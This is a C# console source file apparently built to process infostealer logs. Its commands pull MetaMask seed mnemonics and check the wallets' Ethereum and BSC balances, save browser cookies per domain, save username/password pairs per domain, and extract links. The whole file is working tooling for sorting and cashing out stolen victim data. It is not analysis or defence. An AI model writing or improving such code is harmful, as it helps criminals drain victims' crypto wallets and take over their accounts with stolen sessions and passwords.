using Console.Models;
using Console.Models.Abstractions;
using Console.Models.Attributes;
using Console.Models.Views;
using Core.Parsers;
using Core.Wallets;

namespace Console.Views;

public class MainView : ArgsView
{
    private readonly Settings _settings;
    private readonly Web3Config cfg_web3;
    private readonly ParsingConfig cfg_parse;
    private readonly DataService _data;
    
    public MainView(IRoot root, Settings settings, DataService data, Web3Config cfgWeb3, ParsingConfig cfgParse) : base(root)
    {
        _settings = settings;
        _data = data;
        cfg_web3 = cfgWeb3;
        cfg_parse = cfgParse;
    }

    [Command, Redirect]
    public Task Services() => Task.Run(() => Root.PushRedirect<ServicesView>());
    
    [Command]
    public async Task Wallets()
    {
        var checker = new MetamaskChecker(cfg_web3.Eth, cfg_web3.Bsc);
        var wallets = new MetamaskParser().ByLogs(_settings.Path);

        await _data.SaveAsync("mnemonics", wallets.Select(x => x?.Mnemonic).Distinct());
        
        foreach (var wallet in wallets)
        {
            if (wallet is not {Mnemonic:not null, Password:not null} ||
                wallet.Mnemonic.Split(' ').Length != 12) continue;
            
            System.Console.WriteLine(wallet.Mnemonic);
            
            foreach (var account in wallet.Accounts.Values.OrderBy(x => x.Name))
            {
                System.Console.WriteLine(account.Name);
                System.Console.WriteLine(account.Address);
                
                foreach (var balance in await checker.Balance(account.Address))
                {
                    System.Console.WriteLine($"{balance.Key}: {balance.Value}");
                }
            }
        }

        _ExitWait();
    }

    [Command]
    public async Task Links()
    {
        await _data.SaveAsync("links.txt", cfg_parse.Links.LinksFromLogs(_settings.Path).Select(x => x.ToString()));

        _ExitWait();
    }

    [Command]
    public async Task Cookies()
    {
        foreach (var (domain, cookies) in cfg_parse.Cookies.CookiesFromLogs(_settings.Path)
                     .ToDictionary(
                         x => x.Key,
                         x => x.Value.ToArray()
                     )
                )
        {
            for (var i = 0; i < cookies.Length; i++)
            {
                var data = cookies[i].ToArray();
                
                if (!data.Any()) continue;
                
                await _data.SaveAsync($"cookies{i}", data, subpath: domain);
            }
        }


        _ExitWait();
    }

    [Command]
    public async Task Accounts()
    {
        foreach (var (domain, accounts) in cfg_parse.Accounts.AccountsFromLogs(_settings.Path)
                     .ToDictionary(
                         x => x.Key,
                         x => x.Value.DistinctBy(acc => acc.Username + acc.Password)
                     )
                     .ToDictionary(
                         x => x.Key,
                         x => x.Value.Select(acc => acc.ToStringShort())
                     )
                )
        {
            await _data.SaveAsync(domain, accounts);
        }

        _ExitWait();
    }
}